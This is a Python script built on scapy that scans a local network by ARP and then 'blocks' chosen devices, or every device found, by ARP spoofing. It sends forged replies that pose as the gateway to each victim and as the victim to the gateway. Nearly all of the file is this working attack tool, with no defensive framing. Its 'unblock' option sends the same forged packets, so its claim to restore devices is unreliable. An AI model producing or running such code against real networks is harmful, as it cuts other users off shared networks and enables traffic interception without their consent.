import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import sendp
import socket
import psutil
import time
import os
import threading


def get_active_network_info():
    active_interfaces = psutil.net_if_stats()
    net_io = psutil.net_if_addrs()
    info = ""
    for interface, stats in active_interfaces.items():
        if stats.isup:
            for addr in net_io[interface]:
                if addr.family == socket.AF_INET:
                    info += f"Interface: {interface}\n"
                    info += f"IP: {addr.address}\n"
                    info += f"Netmask: {addr.netmask}\n\n"
    return info


def scan_network(ip_range):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
    return devices


def save_devices_to_file(devices):
    with open("network_devices.txt", "w") as file:
        for device in devices:
            file.write(f"IP Address: {device['ip']}, MAC Address: {device['mac']}\n")
    print("Devices saved to network_devices.txt")


def run_scanner(ip_range):
    devices = scan_network(ip_range)
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Active Network Information:")
    print(network_info)
    print("Devices connected to the network:")
    for device in devices:
        print(f"IP Address: {device['ip']}, MAC Address: {device['mac']}")
    save_devices_to_file(devices)


def block_device(ip_address, mac_address):
    global gateway_ip
    gateway_mac = get_mac(gateway_ip)
    global blocking
    blocking = True

    if gateway_mac:
        success = False
        while blocking:
            packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address)
            packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac)
            sendp(packet_victim, verbose=0)
            sendp(packet_gateway, verbose=0)
            time.sleep(2)

            if not success:
                print(f"Blocking device with IP {ip_address} and MAC {mac_address}...")
                success = True
            else:
                blocking = False
                print(f"IP {ip_address} with MAC {mac_address} has been successfully blocked.")
                return


def block_all_devices(my_ip):
    devices = []
    with open("network_devices.txt", "r") as file:
        for line in file:
            ip, mac = line.strip().split(', ')
            ip_address = ip.split(': ')[1]
            mac_address = mac.split(': ')[1]
            # Skip blocking my device and gateway
            if ip_address != my_ip and ip_address != gateway_ip:
                devices.append((ip_address, mac_address))

    print(f"Starting to block {len(devices)} devices...")
    for ip_address, mac_address in devices:
        block_thread = threading.Thread(target=block_device, args=(ip_address, mac_address))
        block_thread.start()
        time.sleep(1)  # Small delay between starting each block


def unblock_devices():
    global gateway_ip
    devices = []
    with open("network_devices.txt", "r") as file:
        for line in file:
            ip, mac = line.strip().split(', ')
            ip_address = ip.split(': ')[1]
            mac_address = mac.split(': ')[1]
            devices.append((ip_address, mac_address))
    for ip_address, mac_address in devices:
        victim_mac = get_mac(ip_address)
        gateway_mac = get_mac(gateway_ip)
        if victim_mac and gateway_mac:
            packet_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=victim_mac)
            packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac)
            sendp(packet_victim, verbose=0)
            sendp(packet_gateway, verbose=0)
    print("All blocked devices have been unblocked.")


def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for snd, rcv in ans:
        return rcv[Ether].src
    return None


def main():
    global network_info
    network_info = get_active_network_info()
    global blocking
    blocking = False
    global gateway_ip
    gateway_ip = "192.168.1.2"
    global ip_range
    ip_range = "192.168.1.0/24"

    while True:
        print("\nSelect an option:")
        print("1. Scan")
        print("2. Stop")
        print("3. Change IP Scan Range")
        print("4. Change IP Gateway")
        print("5. Block Device")
        print("6. Block All Scanned Devices")
        print("7. Unblock Devices")
        print("8. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            run_scanner(ip_range)
        elif choice == '2':
            print("Stopping and saving results...")
            save_devices_to_file([])
            print("Results saved. Stopping.")
        elif choice == '3':
            new_range = input("Enter new IP scan range (e.g., 192.168.1.0/24): ")
            ip_range = new_range
            print(f"IP scan range updated to: {ip_range}")
        elif choice == '4':
            new_gateway = input("Enter new gateway IP: ")
            gateway_ip = new_gateway
            print(f"Gateway IP updated to: {gateway_ip}")
        elif choice == '5':
            ip_address = input("Enter the IP address to disconnect: ")
            mac_address = input("Enter the MAC address to disconnect: ")
            block_thread = threading.Thread(target=block_device, args=(ip_address, mac_address))
            block_thread.start()
        elif choice == '6':
            my_ip = input("Enter your device's IP address to prevent it from being blocked: ")
            block_all_devices(my_ip)
        elif choice == '7':
            blocking = False
            unblock_devices()
        elif choice == '8':
            blocking = False
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select a valid option.")


if __name__ == "__main__":
    main()